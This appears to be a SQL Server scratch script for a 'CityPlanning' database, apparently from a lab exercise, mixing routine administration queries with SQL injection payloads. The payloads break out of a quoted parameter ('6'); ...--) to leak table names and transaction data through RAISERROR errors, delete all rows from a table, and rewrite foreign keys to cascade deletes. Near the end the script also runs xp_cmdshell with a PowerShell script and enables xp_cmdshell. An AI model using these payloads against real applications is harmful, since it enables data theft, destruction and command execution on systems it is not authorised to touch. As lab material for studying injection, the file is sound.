BACKUP DATABASE CityPlanning TO DISK = 'C:\Backups\CityPlanning_Full_Backup.bak'

RESTORE DATABASE CityPlanning FROM DISK = 'C:\Backups\CityPlanning_Full_Backup.bak'
WITH REPLACE;

USE CityPlanning
USE master

SELECT * FROM Department

DELETE FROM Department
WHERE DepartmentID > 20

SELECT * FROM City
SELECT * FROM Transactions

INSERT INTO Department (DepartmentName, EmployeesNumber, CityID)
VALUES ('Cultura', 100, 1)

SELECT 
    session_id,
    login_name,
    host_name,
    program_name,
    login_time,
    status,
    last_request_start_time
FROM sys.dm_exec_sessions
WHERE database_id = DB_ID('CityPlanning')
ORDER BY login_time DESC;

KILL 53

-- get database tables
'
6'); DECLARE @data VARCHAR(MAX);
SELECT @data = COALESCE(@data + CHAR(13) + CHAR(10), ' ') + TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE'
ORDER BY TABLE_NAME;
RAISERROR('%s', 16, 1, @data); --

-- get transactions
'
6'); 
DECLARE @data VARCHAR(MAX);
SET @data = (SELECT * FROM Transactions FOR XML AUTO);
RAISERROR('%s', 16, 1, @data); --

SELECT 
    OBJECT_NAME(f.parent_object_id) AS TableName,
    COL_NAME(fc.parent_object_id, fc.parent_column_id) AS ColumnName,
    f.name AS ForeignKeyName
FROM 
    sys.foreign_keys AS f
INNER JOIN 
    sys.foreign_key_columns AS fc ON f.object_id = fc.constraint_object_id
WHERE 
    OBJECT_NAME(f.referenced_object_id) = 'Department';

-- delete all rows from Department
'
1'); DELETE FROM Department; --  

-- get key constraints
'
1'); DECLARE @data VARCHAR(MAX); 

SELECT @data = COALESCE(@data + CHAR(13) + CHAR(10), '') + CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
WHERE CONSTRAINT_TYPE = 'FOREIGN KEY'; 

RAISERROR('%s', 16, 1, @data); -- 

SELECT * FROM Department

-- altering key constraints
'
6'); ALTER TABLE [dbo].[Project] DROP CONSTRAINT [FK__Project__Supplie__00200768]; 
ALTER TABLE [dbo].[Project] ADD CONSTRAINT [FK__Project__Supplie__00200768] 
FOREIGN KEY ([SupplierID]) REFERENCES [dbo].[Supplier]([SupplierID]) ON DELETE CASCADE --

EXEC sp_helpconstraint 'Project';
SELECT * FROM Department

'
6'); ALTER TABLE [dbo].[Project] DROP CONSTRAINT [FK__Project__Sponsor__01142BA1]; 
ALTER TABLE [dbo].[Project] ADD CONSTRAINT[FK__Project__Sponsor__01142BA1] 
FOREIGN KEY ([SponsorshipID]) REFERENCES [dbo].[Sponsorship]([SponsorshipID]) ON DELETE CASCADE --

EXEC sp_helpconstraint 'Project';
SELECT * FROM Department

'
6'); ALTER TABLE [dbo].[Employee] DROP CONSTRAINT [FK__Employee__Depart__03F0984C]
ALTER TABLE [dbo].[Employee] ADD CONSTRAINT [FK__Employee__Depart__03F0984C] 
FOREIGN KEY ([DepartmentID]) REFERENCES [dbo].[Department]([DepartmentID]) ON DELETE CASCADE

EXEC sp_helpconstraint 'Employee';

'
6'); ALTER TABLE [dbo].[Employee] DROP CONSTRAINT [FK__Employee__Positi__04E4BC85]
ALTER TABLE [dbo].[Employee] ADD CONSTRAINT [FK__Employee__Positi__04E4BC85]
FOREIGN KEY ([PositionID]) REFERENCES [dbo].[Position]([PositionID]) ON DELETE CASCADE

EXEC sp_helpconstraint 'Employee';

'
6'); ALTER TABLE [dbo].[City] DROP CONSTRAINT [FK__City__BudgetID__71D1E811]
ALTER TABLE [dbo].[City] ADD CONSTRAINT [FK__City__BudgetID__71D1E811] 
FOREIGN KEY ([BudgetID]) REFERENCES [dbo].[Budget]([BudgetID]) ON DELETE CASCADE

EXEC sp_helpconstraint 'City';

'
6'); ALTER TABLE [dbo].[Department] DROP CONSTRAINT [FK__Departmen__CityI__74AE54BC]
ALTER TABLE [dbo].[Department] ADD CONSTRAINT [FK__Departmen__CityI__74AE54BC]
FOREIGN KEY ([CityID]) REFERENCES [dbo].[City]([CityID]) ON DELETE CASCADE

EXEC sp_helpconstraint 'Department';

'
6'); ALTER TABLE [dbo].[Transactions] DROP CONSTRAINT [FK__Transacti__Depar__778AC167]
ALTER TABLE [dbo].[Transactions] ADD CONSTRAINT [FK__Transacti__Depar__778AC167] 
FOREIGN KEY ([DepartmentID]) REFERENCES [dbo].[Department]([DepartmentID]) ON DELETE CASCADE -- 

EXEC sp_helpconstraint 'Transactions';

SELECT * FROM Employee

DROP TABLE Employee

CREATE TABLE Employee (
    EmployeeID INT IDENTITY(1,1) NOT NULL PRIMARY KEY,
    Name VARCHAR(20),
    DepartmentID INT NOT NULL,
    PositionID INT NOT NULL,
	isAdmin BIT NOT NULL,
    FOREIGN KEY (DepartmentID) REFERENCES Department(DepartmentID) ON DELETE CASCADE,
    FOREIGN KEY (PositionID) REFERENCES Position(PositionID) ON DELETE CASCADE
);

UPDATE Employee
          SET isAdmin = 0
          WHERE Name = 'Cretu Luca'

SELECT * FROM Position

INSERT INTO Employee (Name, DepartmentID, PositionID, isAdmin)
VALUES ('Cretu Luca', 31, 2, 0)

'
6');
EXEC xp_cmdshell 'powershell.exe C:\Scripts\script.sh';

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
